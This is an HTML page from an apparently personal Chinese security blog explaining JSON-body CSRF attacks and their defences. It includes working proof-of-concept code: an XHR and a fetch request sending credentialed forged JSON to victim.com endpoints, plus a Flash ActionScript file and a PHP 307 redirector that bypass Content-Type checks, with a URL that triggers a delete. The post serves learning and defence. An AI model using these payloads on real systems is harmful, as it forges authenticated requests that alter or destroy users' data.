@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lnva9say.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="撸起袖子加油学">
+<meta property="og:type" content="article">
+<meta property="og:title" content="json csrf攻击">
+<meta property="og:url" content="https://lnva9say.top/2020/04/16/json-csrf%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="baishuo">
+<meta property="og:description" content="撸起袖子加油学">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-04-16T12:07:38.000Z">
+<meta property="article:modified_time" content="2020-04-18T09:57:12.455Z">
+<meta property="article:author" content="baishuo">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://lnva9say.top/2020/04/16/json-csrf%E6%94%BB%E5%87%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>json csrf攻击 | baishuo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">baishuo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lnva9say.top/2020/04/16/json-csrf%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/baishuo.jpg">
+      <meta itemprop="name" content="baishuo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baishuo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          json csrf攻击
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-16 20:07:38" itemprop="dateCreated datePublished" datetime="2020-04-16T20:07:38+08:00">2020-04-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-18 17:57:12" itemprop="dateModified" datetime="2020-04-18T17:57:12+08:00">2020-04-18</time>
+              </span>
+
+          
+            <div class="post-description">撸起袖子加油学</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><p>CSRF是服务器端没有对用户提交的数据进行严格的把控，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。成因是cookie在浏览器中不会过期，只要不关闭浏览器或退出登陆，再访问此网站，默认是登陆的状态。</p>
+<p>CSRF防御方案：</p>
+<p>​    1）用户操作验证，在提交数据时需要输入验证码</p>
+<p>​    2）请求来源验证，验证请求来源的referer</p>
+<p>​    3）表单token验证</p>
+<p>​    4）在前后端分离的前提下（例如使用ajax提交数据）设置不了token，可以给 cookie 新增 SameSite 属性，通过这个属性可以标记哪个 cookie 只作为同站 cookie （即第一方 cookie，不能作为第三方 cookie），既然不能作为第三方 cookie ，那么别的网站发起第三方请求时，第三方网站是收不到这个被标记关键 cookie，后面的鉴权处理就好办了。这一切都不需要做 token 生命周期的管理，也不用担心 Referer 会丢失或被中途被篡改。</p>
+<h4 id="JSON格式下csrf的实现"><a href="#JSON格式下csrf的实现" class="headerlink" title="JSON格式下csrf的实现"></a>JSON格式下csrf的实现</h4><p>当包中POST中类型为json数据的情况下，我们并不能以常规的POC来采取CSRF攻击。</p>
+<p>当我们以常规CSRF POC对json数据发送的包进行攻击时，接受到的包的Content-Type与正常发送包的Content-Type不一致，也就是不再是application/json。发送包的json多了一个”=”</p>
+<p>原因如下：</p>
+<p>​    1、POST body需要以JSON格式发送，而这种格式在HTML表单元素来构建会比较麻烦。</p>
+<p>​    2、Content-Type头需要设置application/json。设置自定义header需要使用XMLHttpRequests，而它还会向服务器端发送OPTIONS预检请求。</p>
+<p><strong>情况一、不验证CONTENT-TYPE的情况</strong></p>
+<p>如果服务端没有校验Content-Type,或者没有严格校验Content-Type是否为application/json，我们可以使用XHR(XMLHttpRequests)来实现csrf。</p>
+<p>POC：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">style</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span><span class="params">()</span></span></span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">"POST"</span>, <span class="string">"http://victim.com/carrieradmin/admin/priceSheet/priceSheet/savePriceSheet.do"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"application/json, text/plain, */*"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Accept-Language"</span>, <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json; charset=utf-8"</span>);</span></span><br><span class="line"><span class="actionscript">        xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">        xhr.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">"serialNumber"</span>:<span class="string">"CYS1811291899"</span>,<span class="string">"type"</span>:<span class="number">2</span>,<span class="string">"temp"</span>:<span class="number">1</span>,<span class="string">"enableTime"</span>:<span class="string">"2018-11-01 00:00:00"</span>,<span class="string">"disableTime"</span>:<span class="string">"2018-11-29 12:00:00"</span>,<span class="string">"name"</span>:<span class="string">"1"</span>,<span class="string">"supplierCode"</span>:<span class="string">""</span>,<span class="string">"province"</span>:<span class="string">"天津市"</span>,<span class="string">"city"</span>:<span class="string">"天津市"</span>,<span class="string">"region"</span>:<span class="string">"和q区"</span>,<span class="string">"remark"</span>:<span class="string">""</span>,<span class="string">"fromType"</span>:<span class="number">2</span>,<span class="string">"chargeDetailList"</span>:[&#123;<span class="string">"province"</span>:<span class="string">"山西省"</span>,<span class="string">"city"</span>:<span class="string">"晋城市"</span>,<span class="string">"region"</span>:<span class="string">"陵川县"</span>,<span class="string">"price42"</span>:<span class="string">"1"</span>,<span class="string">"price65"</span>:<span class="string">"1"</span>,<span class="string">"price71"</span>:<span class="string">"1"</span>,<span class="string">"price76"</span>:<span class="string">"1"</span>,<span class="string">"priceA"</span>:<span class="string">"11"</span>,<span class="string">"priceB"</span>:<span class="string">""</span>,<span class="string">"priceC"</span>:<span class="string">"1"</span>,<span class="string">"times"</span>:<span class="string">"1"</span>,<span class="string">"unloadPrice"</span>:<span class="string">"1"</span>&#125;]&#125;));</span></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> <span class="attr">onClick</span>=<span class="string">"submitRequest()"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>情况二、验证CONTENT-TYPE的情况</strong></p>
+<p>使用XMR与fetch能够构造出JSON请求，并且能够设置Content-Type,由于CORS策略我们<strong>不能跨域</strong>，除非服务器允许超过自定义的Origin和在响应中为**Access-Control-Allow-Credentials：true</p>
+<p>fetch 发起的请求代码：</p>
+<p>fetch 发起的请求代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSON CSRF POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    fetch(<span class="string">'http://victim.com/vul.page'</span>, &#123;method: <span class="string">'POST'</span>, credentials: <span class="string">'include'</span>, headers: &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;, body: <span class="string">'&#123;"name":"attacker","email":"attacker.com"&#125;'</span>&#125;);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>与xmr一样会发出一个OPTIONS请求</p>
+<p>此时我们可以利用<strong>Flash的跨域</strong>与<strong>307跳转</strong>来绕过http自定义限制，307跟其他3XX HTTP状态码之间的区别就在于，HTTP 307可以确保重定向请求发送之后，请求方法和请求主体不会发生任何改变。HTTP 307会将POST body和HTTP头重定向到我们所指定的最终URL，并完成攻击。</p>
+<p>​    <strong>1、创建flash文件</strong></p>
+<p>​        安装FlexSDK将ActionScript编译为swf文件。Flex需要安装32位的JVM，这一步可以安装32位JDK来完成。</p>
+<p>​        创建一个包含下列ActionScript代码的text文件，文件名为csrf.as。</p>
+<p>​        获取托管Flash文件的主机系统（攻击者的服务器）IP地址/域名，并替换掉代码中的。</p>
+<p>​        运行“mxmlc csrf.as”命令，将该文件编译为csrf.swf。</p>
+<p>​    <strong>2、利用apache的php页面作为服务端(python也可以，也可以使用php作为307跳转服务端)</strong></p>
+<p>​        <a href="https://github.com/sp1d3r/swf_json_csrf" target="_blank" rel="noopener">https://github.com/sp1d3r/swf_json_csrf</a></p>
+<p>​    csrf.as：服务端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">import</span> flash.display.Sprite;</span><br><span class="line">   <span class="keyword">import</span> flash.net.URLLoader;</span><br><span class="line">   <span class="keyword">import</span> flash.net.URLRequest;</span><br><span class="line">   <span class="keyword">import</span> flash.net.URLRequestHeader;</span><br><span class="line">   <span class="keyword">import</span> flash.net.URLRequestMethod;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">csrf</span> <span class="keyword">extends</span> <span class="title">Sprite</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       </span><br><span class="line">      </span><br><span class="line">      <span class="function"><span class="keyword">public</span> function <span class="title">csrf</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">super</span>();</span><br><span class="line">         <span class="keyword">var</span> myJson:String = <span class="keyword">this</span>.root.loaderInfo.parameters.jsonData;</span><br><span class="line">         <span class="keyword">var</span> url:String = <span class="keyword">this</span>.root.loaderInfo.parameters.php_url;</span><br><span class="line">         <span class="keyword">var</span> endpoint:String = <span class="keyword">this</span>.root.loaderInfo.parameters.endpoint;</span><br><span class="line">         <span class="keyword">var</span> ct:String = !!<span class="keyword">this</span>.root.loaderInfo.parameters.ct?<span class="keyword">this</span>.root.loaderInfo.parameters.ct:<span class="string">"application/json"</span>;</span><br><span class="line">         <span class="keyword">var</span> request:URLRequest = <span class="keyword">new</span> URLRequest(url + <span class="string">"?endpoint="</span> + endpoint);</span><br><span class="line">         request.requestHeaders.push(<span class="keyword">new</span> URLRequestHeader(<span class="string">"Content-Type"</span>,ct));</span><br><span class="line">         request.data = myJson;</span><br><span class="line">         request.method = URLRequestMethod.POST;</span><br><span class="line">         <span class="keyword">var</span> urlLoader:URLLoader = <span class="keyword">new</span> URLLoader();</span><br><span class="line">         <span class="keyword">try</span></span><br><span class="line">         &#123;</span><br><span class="line">            urlLoader.load(request);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">catch</span>(e:Error)</span><br><span class="line">         &#123;</span><br><span class="line">            trace(e);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>307.php：跳转</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$victim_url = $_GET[<span class="string">'endpoint'</span>];</span><br><span class="line">header(<span class="string">"Location: $victim_url"</span>, <span class="keyword">true</span>, <span class="number">307</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.16.11.102/csrf/test.swf?jsonData=&#123;%22id%22:49&#125;&amp;php_url=http://172.16.11.102/csrf/test.php&amp;endpoint=http://victim.com/carrieradmin/admin/car/delete&amp;ct=application/json</span></span><br></pre></td></tr></table></figure>
+
+<p>​        </p>
+<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>首先我们需要了解 flash：Adobe Flash 可用于使用 ActionScript 制作 Web 请求，而 ActionScript 还可以用于为 Web 请求设置自定义的 HTTP 头。</p>
+<p>一般来说 Flash 不会向没有 crossdomain.xml 文件的服务器发出请求，对方服务器是不可控的，因此为了完全避免跨域文件，我们在自己服务器上先准备一个 flash 文件和一个重定向文件。</p>
+<p>我们使用 Flash 和我们的 POST 有效载荷向重定向文件发出请求。然后该文件充当重定向器，将请求转到我们想要攻击的服务器上。</p>
+<p>HTTP 状态码 307：HTTP 307 可以确保在重定向请求发生时请求方法和请求主体不会发生改变。</p>
+<p>也就是说我们通过重定向文件转发的请求是完完全全不变的转发过去的包括 Body 和 HTTP 头</p>
+<h4 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h4><p>当访问最后的POC，过程如下：</p>
+<p>1、受害者访问POC，向attacter.com发起一条swf请求，swf向307.php发送HTTP POST请求。</p>
+<p>2、attacter.com的307.php发起307跳转，跳转到victim.com，注意307跳转会带着http请求方式，header和postdata进行跳转。</p>
+<p>3、victim.com收到一条POST请求，并且Content-Type为application/json。</p>
+<p>4、victim.com收到一条/crossdomain.xml请求。由于第三步优先第四步执行，导致跨域。并且victim.com能收到crossdomain.xml请求，也证明了第三步的POST请求是Flash发出，而不是307.php发出。因为307.php单独发出的post请求不会主动请求crossdomain.xml。</p>
+<p>我们知道，服务器A的Flash如果要向B发起一条HTTP请求，会先请求服务器B的crossdomain.xml文件，判断是否能跨域，如果文件没有，或者xml文件设置不能跨域，则不能跨域。</p>
+<p>既然可以设置Content-Type，那么能设置Referer吗。如果能，那验证Referer的CSRF岂不都能绕过？</p>
+<p>其实Flash的Header存在一个黑名单，黑名单列表的头不允许设置，其中就有Referer。不能设置的头标如下：</p>
+<p>Accept-Charset、Accept-Encoding、Accept-Ranges、Age、Allow、Allowed、Authorization、Charge-To、Connect、Connection、Content-Length、Content-Location、Content-Range、Cookie、Date、Delete、ETag、Expect、Get、Head、Host、Keep-Alive、Last-Modified、Location、Max-Forwards、Options、Post、Proxy-Authenticate、Proxy-Authorization、Proxy-Connection、Public、Put、Range、Referer、Request-Range、Retry-After、Server、TE、Trace、Trailer、Transfer-Encoding、Upgrade、URI、User-Agent、Vary、Via、Warning、WWW-Authenticate 和 x-flash-version。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/14/RMI/" rel="prev" title="RMI">
+      <i class="fa fa-chevron-left"></i> RMI
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/16/Redis-getshell/" rel="next" title="Redis getshell">
+      Redis getshell <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF漏洞"><span class="nav-number">1.</span> <span class="nav-text">CSRF漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JSON格式下csrf的实现"><span class="nav-number">1.1.</span> <span class="nav-text">JSON格式下csrf的实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原理："><span class="nav-number">1.2.</span> <span class="nav-text">原理：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#最后："><span class="nav-number">1.3.</span> <span class="nav-text">最后：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baishuo"
+      src="/images/baishuo.jpg">
+  <p class="site-author-name" itemprop="name">baishuo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">baishuo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
